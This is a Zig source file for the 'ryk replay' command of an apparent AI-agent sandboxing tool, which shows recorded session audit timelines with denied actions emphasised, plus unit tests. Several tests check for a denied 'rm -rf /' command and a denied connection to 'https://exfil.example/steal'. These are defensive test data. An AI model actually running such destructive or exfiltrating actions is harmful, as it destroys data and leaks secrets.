const std = @import("std");
const gpa_mod = @import("gpa.zig");

const core = @import("ryk_core").core;
const supervisor = core.supervisor;
const core_api = @import("ryk_core").api;
const brand = @import("brand.zig");
const exit_codes = @import("exit_codes.zig");
const help = @import("help.zig");
const rust_visibility = @import("rust_visibility.zig");
const tui = @import("ryk").tui;
const enable_tui = @import("build_options").enable_tui;
const suggestions = @import("suggestions.zig");

const ReplayCliOptions = struct {
    session: []const u8 = "last",
    json: bool = false,
    only_denied: bool = false,
    verify: bool = false,
    list: bool = false,
    /// Phase 7: opt-in alt-screen timeline view (`ryk replay --tui`). Default
    /// stays linear (invariant #1: --json frozen). Rejected on non-TTY / --json.
    tui_view: bool = false,
    /// When true, a missing default `last` session lists sessions instead of erroring.
    fallback_to_list: bool = false,
};

pub fn command(io: std.Io, argv: []const []const u8, stdout: anytype, stderr: anytype) !u8 {
    const options = parseOptions(io, argv, stdout, stderr) catch |err| switch (err) {
        error.HelpShown => return exit_codes.success,
        error.Usage => return exit_codes.usage,
        else => return err,
    };

    var gpa_state: gpa_mod.State = .init;
    defer _ = gpa_state.deinit();
    const allocator = gpa_state.allocator();

    const workspace_root = supervisor.resolveWorkspaceRoot(io, allocator, null, ".") catch |err| {
        try stderr.print("ryk replay: failed to resolve workspace: {s}\n", .{@errorName(err)});
        return exit_codes.general;
    };
    defer allocator.free(workspace_root);

    if (options.list) {
        return listSessions(io, allocator, workspace_root, stdout);
    }

    return replaySession(io, allocator, workspace_root, options, stdout, stderr);
}

fn replaySession(
    io: std.Io,
    allocator: std.mem.Allocator,
    workspace_root: []const u8,
    options: ReplayCliOptions,
    stdout: anytype,
    stderr: anytype,
) !u8 {
    // Phase 7: --tui preflight BEFORE session load. --tui is a human-only
    // alt-screen view: it must not combine with --json (frozen machine contract,
    // invariant #1) and must not enter the alt-screen on non-interactive output
    // (invariant #2). Reject up front so a missing session never masks the flag
    // conflict and we never load data we'll refuse to render.
    if (options.tui_view) {
        if (comptime !enable_tui) {
            try stderr.writeAll("ryk replay: --tui is not available in this build.\n");
            return exit_codes.usage;
        }
        if (options.json) {
            try stderr.writeAll("ryk replay: --tui cannot be combined with --json (machine output is frozen).\n");
            return exit_codes.usage;
        }
        if (!tui.output_policy.shouldEnterTuiIo(io, &.{ "--tui" })) {
            try stderr.writeAll("ryk replay: --tui needs an interactive colour terminal. Drop --tui, or unset NO_COLOR / --no-rich.\n");
            return exit_codes.usage;
        }
    }

    var session = core_api.loadReplay(io, allocator, workspace_root, .{
        .session = options.session,
        .only_denied = options.only_denied,
        .verify = options.verify,
    }) catch |err| switch (err) {
        error.FileNotFound => {
            if (options.fallback_to_list) {
                return listSessions(io, allocator, workspace_root, stdout);
            }
            try stderr.writeAll("ryk replay: session not found.\n");
            return exit_codes.general;
        },
        error.HashVerificationFailed => {
            const session_dir_path = sessionDirPathForError(io, allocator, workspace_root, options.session) catch null;
            defer if (session_dir_path) |path| allocator.free(path);
            const verify_result = if (session_dir_path) |path| core_api.verifyReplay(io, allocator, path) catch null else null;
            if (verify_result) |result| {
                defer result.deinit(allocator);
                if (result.reason) |reason| try stderr.print("ryk replay: hash verification failed: {s}\n", .{reason}) else try stderr.writeAll("ryk replay: hash verification failed.\n");
            } else {
                try stderr.writeAll("ryk replay: hash verification failed.\n");
            }
            return exit_codes.general;
        },
        else => {
            try stderr.print("ryk replay: failed: {s}\n", .{@errorName(err)});
            return exit_codes.general;
        },
    };
    defer session.deinit();

    if (options.json) {
        try core_api.writeReplayJson(stdout, session);
    } else if (options.tui_view) {
        if (comptime enable_tui) {
            const lines = try buildTimelineLinesForTui(allocator, session);
            defer freeTimelineLines(allocator, lines);
            try tui.live_view.run(io, stdout, "replay", lines, null, null);
        } else {
            try stderr.writeAll("ryk replay: --tui is not available in this build.\n");
            return exit_codes.usage;
        }
    } else {
        try writeReplayHuman(io, allocator, stdout, session, options.verify);
    }
    return exit_codes.success;
}

/// Deny emphasis for human/TUI replay: mirrors audit `only_denied` semantics
/// (`*_denied` type suffix and/or decision result `deny`).
fn isDeniedEvent(event: core_api.ReplayEvent) bool {
    return event.isDenied();
}

const ReplayTimelineRow = struct {
    icon: []const u8,
    detail: []const u8,
    denied: bool,
};

fn writeReplayHuman(
    io: std.Io,
    allocator: std.mem.Allocator,
    stdout: anytype,
    session: core_api.ReplaySession,
    show_verify: bool,
) !void {
    try tui.render.definitionList(io, stdout, &.{
        .{ .term = "Session", .description = session.session_id },
        .{ .term = "Command", .description = session.command_display },
        .{ .term = "Policy", .description = session.policy },
        .{ .term = "Status", .description = session.status_display },
    });
    try stdout.writeByte('\n');

    // Dominant summary when denials are present (demo gold: bare `ryk replay`).
    var denied_count: usize = 0;
    for (session.events) |event| {
        if (isDeniedEvent(event)) denied_count += 1;
    }
    if (denied_count > 0) {
        var deny_body: std.ArrayList(u8) = .empty;
        defer deny_body.deinit(allocator);
        try deny_body.print(allocator, "{d} action(s) blocked:", .{denied_count});
        var listed: usize = 0;
        var first_target: ?[]const u8 = null;
        for (session.events) |event| {
            if (!isDeniedEvent(event)) continue;
            if (first_target == null) first_target = event.target_value;
            if (listed == 0) {
                try deny_body.print(allocator, " {s}", .{event.target_value});
            } else if (listed < 4) {
                try deny_body.print(allocator, " · {s}", .{event.target_value});
            } else if (listed == 4) {
                try deny_body.print(allocator, " · …", .{});
            }
            listed += 1;
        }
        // Progressive what-now pointer (same pack tools as run deny block).
        // Single-quote for paste safety (F24) — matches formatDenyNextSteps.
        if (first_target) |target| {
            const quoted = try rust_visibility.shellSingleQuoteAlloc(allocator, target);
            defer allocator.free(quoted);
            try deny_body.print(allocator, "\nUnderstand: ryk explain {s}", .{quoted});
        }
        try tui.render.callout(io, stdout, .danger, "Denied actions", deny_body.items);
        try stdout.writeByte('\n');
    }

    // Evidence-plane degradation is prominent too (P1-1).
    try writeAuditDegradedCallout(io, allocator, stdout, session.events);

    // Build grouped timeline rows (collapse runs of secret_redacted).
    const rows = try allocator.alloc(ReplayTimelineRow, session.events.len);
    defer allocator.free(rows);
    const owned_details = try allocator.alloc(?[]u8, session.events.len);
    defer allocator.free(owned_details);
    @memset(owned_details, null);
    defer for (owned_details) |detail| if (detail) |value| allocator.free(value);

    var timeline_len: usize = 0;
    var event_index: usize = 0;
    while (event_index < session.events.len) {
        const event = session.events[event_index];
        var group_len: usize = 1;
        if (std.mem.eql(u8, event.event_type, "secret_redacted")) {
            while (event_index + group_len < session.events.len and
                std.mem.eql(u8, session.events[event_index + group_len].event_type, "secret_redacted"))
            {
                group_len += 1;
            }
        }

        const detail = if (group_len > 1)
            try std.fmt.allocPrint(allocator, "{s} · {s} · {d} secret redactions · {s}", .{
                event.timestamp,
                event.event_type,
                group_len,
                event.target_value,
            })
        else
            try std.fmt.allocPrint(allocator, "{s} · {s} · {s}", .{
                event.timestamp,
                event.event_type,
                event.target_value,
            });
        owned_details[timeline_len] = detail;
        rows[timeline_len] = .{
            .icon = replayEventIcon(event.event_type),
            .detail = detail,
            .denied = isDeniedEvent(event),
        };
        timeline_len += 1;
        event_index += group_len;
    }

    // Custom timeline: denied rows use danger token + DENY badge so they dominate.
    try writeReplayTimeline(io, stdout, rows[0..timeline_len]);
    if (show_verify) {
        try stdout.writeByte('\n');
        try tui.render.callout(io, stdout, if (session.verified) .success else .warn, "Hash chain", if (session.verified) "verified" else "not verified");
    }
}

/// Render a timeline with deny rows visually dominant (danger paint + DENY badge).
/// Non-deny rows match `tui.render.timeline` plain-mode structure (`├ icon  detail`).
fn writeReplayTimeline(io: std.Io, stdout: anytype, rows: []const ReplayTimelineRow) !void {
    for (rows, 0..) |row, index| {
        try stdout.writeAll("  ");
        try tui.theme.paint(io, stdout, .muted, if (index + 1 == rows.len) "└" else "├");
        try stdout.writeAll(" ");
        if (row.denied) {
            try tui.theme.paintBold(io, stdout, .danger, row.icon);
            try stdout.writeAll(" ");
            try tui.render.badge(io, stdout, .deny);
            try stdout.writeAll("  ");
            if (row.detail.len > 0) try tui.theme.paint(io, stdout, .danger, row.detail);
        } else {
            try tui.theme.paintBold(io, stdout, .text_bright, row.icon);
            if (row.detail.len > 0) {
                try stdout.writeAll("  ");
                try tui.terminal_text.write(stdout, row.detail, .single_line);
            }
        }
        try stdout.writeAll("\n");
    }
}

fn replayEventIcon(event_type: []const u8) []const u8 {
    if (std.mem.endsWith(u8, event_type, "_allowed")) return "✓";
    if (std.mem.endsWith(u8, event_type, "_denied")) return "✗";
    if (std.mem.eql(u8, event_type, "secret_redacted")) return "⚠";
    if (std.mem.eql(u8, event_type, "audit_degraded")) return "⚠";
    if (std.mem.startsWith(u8, event_type, "session_")) return "ℹ";
    return "•";
}

/// Evidence-plane degradation callout (P1-1): a session with audit_degraded
/// events has shim execs with no in-shim audit record — surface it prominently.
fn writeAuditDegradedCallout(io: std.Io, allocator: std.mem.Allocator, stdout: anytype, events: []const core_api.ReplayEvent) !void {
    var degraded_count: usize = 0;
    var first_degraded_reason: ?[]u8 = null;
    defer if (first_degraded_reason) |reason| allocator.free(reason);
    for (events) |event| {
        if (!std.mem.eql(u8, event.event_type, "audit_degraded")) continue;
        degraded_count += 1;
        if (first_degraded_reason == null) first_degraded_reason = try degradedReasonFromRaw(allocator, event.raw);
    }
    if (degraded_count == 0) return;
    var degraded_body: std.ArrayList(u8) = .empty;
    defer degraded_body.deinit(allocator);
    try degraded_body.print(allocator, "{d} audit_degraded event(s): session evidence is incomplete — some allowed shim execs have no in-shim audit record.", .{degraded_count});
    if (first_degraded_reason) |reason| try degraded_body.print(allocator, " Reason: {s}", .{reason});
    try tui.render.callout(io, stdout, .warn, "Audit degraded", degraded_body.items);
    try stdout.writeByte('\n');
}

/// Pull `decision.reason` out of a raw event line for the degraded callout.
fn degradedReasonFromRaw(allocator: std.mem.Allocator, raw: []const u8) !?[]u8 {
    var parsed = std.json.parseFromSlice(std.json.Value, allocator, raw, .{}) catch return null;
    defer parsed.deinit();
    if (parsed.value != .object) return null;
    const decision = parsed.value.object.get("decision") orelse return null;
    if (decision != .object) return null;
    const reason = decision.object.get("reason") orelse return null;
    if (reason != .string) return null;
    return try allocator.dupe(u8, reason.string);
}

/// Build the flat, pre-rendered lines for the `--tui` alt-screen timeline view.
/// Mirrors `writeReplayHuman`'s redaction-grouping (collapsing runs of
/// `secret_redacted`) so the scrollable view carries the same information as the
/// linear render. The caller owns the returned slice and each line; free with
/// `freeTimelineLines`. This path is isolated from `writeReplayHuman` so the
/// linear + --json byte contracts are untouched.
fn buildTimelineLinesForTui(allocator: std.mem.Allocator, session: core_api.ReplaySession) ![][]const u8 {
    var lines: std.ArrayList([]const u8) = .empty;
    errdefer {
        for (lines.items) |line| allocator.free(line);
        lines.deinit(allocator);
    }

    // Session header for context.
    try lines.append(allocator, try std.fmt.allocPrint(allocator, "Session   {s}", .{session.session_id}));
    try lines.append(allocator, try std.fmt.allocPrint(allocator, "Command   {s}", .{session.command_display}));
    try lines.append(allocator, try std.fmt.allocPrint(allocator, "Policy    {s}", .{session.policy}));
    try lines.append(allocator, try std.fmt.allocPrint(allocator, "Status    {s}", .{session.status_display}));
    try lines.append(allocator, try allocator.dupe(u8, ""));
    try lines.append(allocator, try allocator.dupe(u8, "Timeline"));

    var event_index: usize = 0;
    while (event_index < session.events.len) {
        const event = session.events[event_index];
        var group_len: usize = 1;
        if (std.mem.eql(u8, event.event_type, "secret_redacted")) {
            while (event_index + group_len < session.events.len and
                std.mem.eql(u8, session.events[event_index + group_len].event_type, "secret_redacted"))
            {
                group_len += 1;
            }
        }
        const icon = replayEventIcon(event.event_type);
        const denied = isDeniedEvent(event);
        const line = if (group_len > 1)
            try std.fmt.allocPrint(allocator, "{s}  {s} · {s} · {d} secret redactions · {s}", .{
                icon, event.timestamp, event.event_type, group_len, event.target_value,
            })
        else if (denied)
            // Prefix DENY so the alt-screen list keeps denials scannable without colour.
            try std.fmt.allocPrint(allocator, "{s} [DENY]  {s} · {s} · {s}", .{
                icon, event.timestamp, event.event_type, event.target_value,
            })
        else
            try std.fmt.allocPrint(allocator, "{s}  {s} · {s} · {s}", .{
                icon, event.timestamp, event.event_type, event.target_value,
            });
        try lines.append(allocator, line);
        event_index += group_len;
    }

    return try lines.toOwnedSlice(allocator);
}

fn freeTimelineLines(allocator: std.mem.Allocator, lines: [][]const u8) void {
    for (lines) |line| allocator.free(line);
    allocator.free(lines);
}

/// Friendly empty-state copy for bare `ryk replay` / `--list` when nothing is recorded.
/// Points operators at Safe Launch (`start` + agent), never a raw FileNotFound dump.
const empty_sessions_hint =
    \\No sessions yet. Run `ryk start` then `ryk <agent>` (for example `ryk claude`) to create a protected session.
    \\
;

const SessionListMeta = struct {
    updated: []const u8,
    command: []const u8,
};

fn truncateId(id: []const u8) []const u8 {
    return if (id.len <= 20) id else id[0..20];
}

fn readSessionListMeta(
    io: std.Io,
    allocator: std.mem.Allocator,
    sessions_dir: []const u8,
    session_id: []const u8,
    updated_buf: []u8,
    command_buf: []u8,
) SessionListMeta {
    const events_path = std.fs.path.join(allocator, &.{ sessions_dir, session_id, "events.jsonl" }) catch
        return .{ .updated = "-", .command = "-" };
    defer allocator.free(events_path);
    const mtime = std.Io.Dir.cwd().statFile(io, events_path, .{}) catch null;
    const updated: []const u8 = if (mtime) |st|
        std.fmt.bufPrint(updated_buf, "{d}", .{st.mtime.toSeconds()}) catch "-"
    else
        "-";

    const summary_path = std.fs.path.join(allocator, &.{ sessions_dir, session_id, "summary.json" }) catch
        return .{ .updated = updated, .command = "-" };
    defer allocator.free(summary_path);
    const summary = std.Io.Dir.cwd().readFileAlloc(io, summary_path, allocator, .limited(8 * 1024)) catch
        return .{ .updated = updated, .command = "-" };
    defer allocator.free(summary);
    const command_text = extractSummaryCommand(summary, command_buf);
    return .{ .updated = updated, .command = command_text };
}

fn extractSummaryCommand(summary: []const u8, buf: []u8) []const u8 {
    const key = "\"command\"";
    const start = std.mem.indexOf(u8, summary, key) orelse return "-";
    const after = summary[start + key.len ..];
    const q1 = std.mem.indexOfScalar(u8, after, '"') orelse return "-";
    const rest = after[q1 + 1 ..];
    const q2 = std.mem.indexOfScalar(u8, rest, '"') orelse return "-";
    const raw = rest[0..q2];
    const n = @min(raw.len, buf.len);
    @memcpy(buf[0..n], raw[0..n]);
    return buf[0..n];
}

fn listSessions(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8, stdout: anytype) !u8 {
    const sessions_dir = try std.fs.path.join(allocator, &.{ workspace_root, ".ryk", "sessions" });
    defer allocator.free(sessions_dir);

    var dir = std.Io.Dir.cwd().openDir(io, sessions_dir, .{ .iterate = true }) catch |err| switch (err) {
        error.FileNotFound => {
            try stdout.writeAll(empty_sessions_hint);
            return exit_codes.success;
        },
        else => return err,
    };
    defer dir.close(io);

    try stdout.writeAll("SESSION              UPDATED              COMMAND\n");

    var count: usize = 0;
    var iter = dir.iterate();
    while (try iter.next(io)) |entry| {
        if (entry.kind != .directory) continue;
        var updated_buf: [20]u8 = undefined;
        var command_buf: [48]u8 = undefined;
        const meta = readSessionListMeta(io, allocator, sessions_dir, entry.name, &updated_buf, &command_buf);
        try stdout.print("{s}\t{s}\t{s}\n", .{
            truncateId(entry.name),
            meta.updated,
            meta.command,
        });
        count += 1;
    }

    if (count == 0) {
        try stdout.writeAll("\n");
        try stdout.writeAll(empty_sessions_hint);
    } else {
        try stdout.print("\n{d} session(s) found.\n", .{count});
        try stdout.writeAll("Run `ryk replay --session <id>` to view a session.\n");
    }

    return exit_codes.success;
}

fn parseOptions(io: std.Io, argv: []const []const u8, stdout: anytype, stderr: anytype) !ReplayCliOptions {
    var options: ReplayCliOptions = .{
        .fallback_to_list = argv.len == 0,
    };
    var index: usize = 0;
    while (index < argv.len) : (index += 1) {
        const arg = argv[index];
        if (std.mem.eql(u8, arg, "--help") or std.mem.eql(u8, arg, "-h")) {
            _ = try help.writeCommand(io, stdout, "replay");
            return error.HelpShown;
        } else if (std.mem.eql(u8, arg, "--list")) {
            options.list = true;
        } else if (std.mem.eql(u8, arg, "--session")) {
            index += 1;
            if (index >= argv.len) {
                try stderr.writeAll("ryk replay: --session requires a session id or 'last'.\n");
                return error.Usage;
            }
            options.session = argv[index];
            options.fallback_to_list = false;
        } else if (std.mem.eql(u8, arg, "--json")) {
            options.json = true;
            options.fallback_to_list = false;
        } else if (std.mem.eql(u8, arg, "--verify")) {
            options.verify = true;
            options.fallback_to_list = false;
        } else if (std.mem.eql(u8, arg, "--only")) {
            index += 1;
            if (index >= argv.len or !std.mem.eql(u8, argv[index], "denied")) {
                try stderr.writeAll("ryk replay: --only currently supports only 'denied'.\n");
                return error.Usage;
            }
            options.only_denied = true;
            options.fallback_to_list = false;
        } else if (std.mem.eql(u8, arg, "--tui")) {
            // Phase 7: opt-in alt-screen timeline view. Linear output is the
            // default; --json stays frozen and cannot combine with --tui.
            options.tui_view = true;
            options.fallback_to_list = false;
        } else {
            try suggestions.writeUnknownOption(stderr, "ryk replay", arg, &.{ "--list", "--session", "--json", "--verify", "--only", "--tui", "--help", "-h" }, "replay");
            return error.Usage;
        }
    }
    return options;
}

fn sessionDirPathForError(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8, requested: []const u8) ![]u8 {
    const session_id = if (std.mem.eql(u8, requested, "last")) blk: {
        const last_path = try std.fs.path.join(allocator, &.{ workspace_root, ".ryk", "last" });
        defer allocator.free(last_path);
        const text = try std.Io.Dir.cwd().readFileAlloc(io, last_path, allocator, .limited(core.limits.max_session_id_len + 2));
        defer allocator.free(text);
        break :blk try allocator.dupe(u8, std.mem.trim(u8, text, " \t\r\n"));
    } else try allocator.dupe(u8, requested);
    defer allocator.free(session_id);
    return try std.fs.path.join(allocator, &.{ workspace_root, ".ryk", "sessions", session_id });
}

test "replay rejects invalid --only value" {
    var stdout_buf: [512]u8 = undefined;
    var stderr_buf: [512]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    const code = try command(std.testing.io, &.{ "--only", "allowed" }, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.usage, code);
    try std.testing.expect(std.mem.indexOf(u8, stderr_writer.buffered(), "--only") != null);
}

test "replay --list prints sessions or friendly empty message" {
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();

    try tmp.dir.createDirPath(std.testing.io, ".ryk");
    {
        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
        defer policy_file.close(std.testing.io);
        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: observe\n");
    }
    try tmp.dir.createDirPath(std.testing.io, ".ryk/sessions/session-a");
    try tmp.dir.createDirPath(std.testing.io, ".ryk/sessions/session-b");

    const prev_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(prev_cwd);
    try std.process.setCurrentDir(std.testing.io, tmp.dir);
    defer std.process.setCurrentPath(std.testing.io, prev_cwd) catch {};

    var stdout_buf: [1024]u8 = undefined;
    var stderr_buf: [256]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    const code = try command(std.testing.io, &.{"--list"}, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.success, code);
    const output = stdout_writer.buffered();
    try std.testing.expect(std.mem.indexOf(u8, output, "session-a") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "session-b") != null);
}

test "replay with no args and no sessions shows friendly empty state" {
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();

    try tmp.dir.createDirPath(std.testing.io, ".ryk");
    {
        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
        defer policy_file.close(std.testing.io);
        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: observe\n");
    }

    const prev_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(prev_cwd);
    try std.process.setCurrentDir(std.testing.io, tmp.dir);
    defer std.process.setCurrentPath(std.testing.io, prev_cwd) catch {};

    var stdout_buf: [512]u8 = undefined;
    var stderr_buf: [256]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    const code = try command(std.testing.io, &.{}, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.success, code);
    const output = stdout_writer.buffered();
    // Friendly empty state — not a raw FileNotFound dump; points at Safe Launch.
    try std.testing.expect(std.mem.indexOf(u8, output, "No sessions") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "ryk start") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "ryk <agent>") != null or std.mem.indexOf(u8, output, "agent") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "FileNotFound") == null);
    try std.testing.expectEqualStrings("", stderr_writer.buffered());
}

test "replay with no args loads last session timeline" {
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(root);
    try tmp.dir.createDirPath(std.testing.io, ".ryk");
    {
        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
        defer policy_file.close(std.testing.io);
        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
    }
    const session_id = try writeReplayTimelineFixture(std.testing.io, std.testing.allocator, root);
    defer std.testing.allocator.free(session_id);

    const previous_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(previous_cwd);
    try std.process.setCurrentDir(std.testing.io, tmp.dir);
    defer std.process.setCurrentPath(std.testing.io, previous_cwd) catch {};

    var stdout_buf: [4096]u8 = undefined;
    var stderr_buf: [512]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    // Bare `ryk replay` — no --session required; defaults to last.
    const code = try command(std.testing.io, &.{}, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.success, code);
    try std.testing.expectEqualStrings("", stderr_writer.buffered());
    const output = stdout_writer.buffered();
    try std.testing.expect(std.mem.indexOf(u8, output, session_id) != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "3 secret redactions") != null);
}

test "replay human timeline emphasizes denied actions" {
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(root);
    try tmp.dir.createDirPath(std.testing.io, ".ryk");
    {
        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
        defer policy_file.close(std.testing.io);
        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
    }
    const session_id = try writeReplayDenyFixture(std.testing.io, std.testing.allocator, root);
    defer std.testing.allocator.free(session_id);

    const previous_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(previous_cwd);
    try std.process.setCurrentDir(std.testing.io, tmp.dir);
    defer std.process.setCurrentPath(std.testing.io, previous_cwd) catch {};

    var stdout_buf: [4096]u8 = undefined;
    var stderr_buf: [512]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    const code = try command(std.testing.io, &.{}, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.success, code);
    try std.testing.expectEqualStrings("", stderr_writer.buffered());
    const output = stdout_writer.buffered();
    // Denied actions visually dominant: summary callout + DENY badge on the row.
    try std.testing.expect(std.mem.indexOf(u8, output, "Denied") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "[DENY]") != null or std.mem.indexOf(u8, output, "DENY") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "rm -rf /") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "command_denied") != null);
}

test "replay human timeline emphasizes network_connect_denied without command_denied" {
    // M-4: deny classifier must treat *_denied event types (not only command_denied).
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(root);
    try tmp.dir.createDirPath(std.testing.io, ".ryk");
    {
        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
        defer policy_file.close(std.testing.io);
        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
    }
    const session_id = try writeReplayNetworkDenyFixture(std.testing.io, std.testing.allocator, root);
    defer std.testing.allocator.free(session_id);

    const previous_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(previous_cwd);
    try std.process.setCurrentDir(std.testing.io, tmp.dir);
    defer std.process.setCurrentPath(std.testing.io, previous_cwd) catch {};

    var stdout_buf: [4096]u8 = undefined;
    var stderr_buf: [512]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    const code = try command(std.testing.io, &.{}, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.success, code);
    try std.testing.expectEqualStrings("", stderr_writer.buffered());
    const output = stdout_writer.buffered();
    // No command_denied in this fixture — DENY badge/callout must still appear.
    try std.testing.expect(std.mem.indexOf(u8, output, "command_denied") == null);
    try std.testing.expect(std.mem.indexOf(u8, output, "network_connect_denied") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "Denied") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "[DENY]") != null or std.mem.indexOf(u8, output, "DENY") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "https://exfil.example/steal") != null);
}

test "replay surfaces audit_degraded sessions with a warn callout" {
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(root);
    try tmp.dir.createDirPath(std.testing.io, ".ryk");
    {
        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
        defer policy_file.close(std.testing.io);
        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
    }
    const session_id = try writeReplayDegradedFixture(std.testing.io, std.testing.allocator, root);
    defer std.testing.allocator.free(session_id);

    const previous_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(previous_cwd);
    try std.process.setCurrentDir(std.testing.io, tmp.dir);
    defer std.process.setCurrentPath(std.testing.io, previous_cwd) catch {};

    var stdout_buf: [4096]u8 = undefined;
    var stderr_buf: [512]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    const code = try command(std.testing.io, &.{}, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.success, code);
    const output = stdout_writer.buffered();
    try std.testing.expect(std.mem.indexOf(u8, output, "Audit degraded") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "audit_degraded") != null);
    try std.testing.expect(std.mem.indexOf(u8, output, "control write-deny residual") != null);
}

fn writeReplayDegradedFixture(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8) ![]u8 {
    const now = core.time.Timestamp.fromUnixSeconds(1_777_983_130);
    var session_id: core.session.SessionId = .{ .value = undefined, .len = 0 };
    const session_id_text = try std.fmt.bufPrint(&session_id.value, "replay-degraded-fixture", .{});
    session_id.len = session_id_text.len;
    const session = core.session.Session{
        .id = session_id,
        .started_at = now,
        .ended_at = now,
        .command = "ryk",
        .args = &.{ "run", "--", "echo", "ok" },
        .workspace_root = workspace_root,
        .session_name = "replay-degraded-test",
        .mode = .strict,
        .platform = core.platform.detectOs(),
    };
    var audit_writer = try core_api.createAuditWriter(io, allocator, session);
    defer audit_writer.deinit();

    var degraded_id: core.event.EventId = .{ .value = undefined, .len = 0 };
    const degraded_id_text = try std.fmt.bufPrint(&degraded_id.value, "degraded", .{});
    degraded_id.len = degraded_id_text.len;
    const degraded = try core_api.createAuditEvent(.{
        .session_id = session.id,
        .event_id = degraded_id,
        .timestamp = now,
        .event_type = .audit_degraded,
        .actor = .{ .kind = .ryk, .display = "ryk" },
        .target = .{ .kind = .session, .value = session.id.slice() },
        .decision = core_api.makeDecision(.{
            .result = .observe,
            .reason = "shim audit open denied (control write-deny residual) without parent attestation; at least one allowed shim exec has no in-shim audit event",
        }),
    });
    try core_api.appendAuditEvent(&audit_writer, degraded);

    try audit_writer.writeLastPointer();
    try core_api.writeAuditSummary(allocator, audit_writer.sessionDirPath(), .{
        .session = session,
        .status = .{ .exited = 0 },
        .event_count = audit_writer.event_count,
        .final_event_hash = audit_writer.finalHash() orelse "",
        .policy = ".ryk/policy.yaml",
        .product_label = brand.product_display,
    });
    return allocator.dupe(u8, session.id.slice());
}

test "isDeniedFields mirrors audit only_denied semantics" {
    try std.testing.expect(core_api.isDeniedFields("command_denied", null));
    try std.testing.expect(core_api.isDeniedFields("network_connect_denied", null));
    try std.testing.expect(core_api.isDeniedFields("file_write_denied", null));
    try std.testing.expect(core_api.isDeniedFields("command_allowed", "deny"));
    try std.testing.expect(!core_api.isDeniedFields("command_allowed", "allow"));
    try std.testing.expect(!core_api.isDeniedFields("command_allowed", null));
    try std.testing.expect(!core_api.isDeniedFields("secret_redacted", null));
}

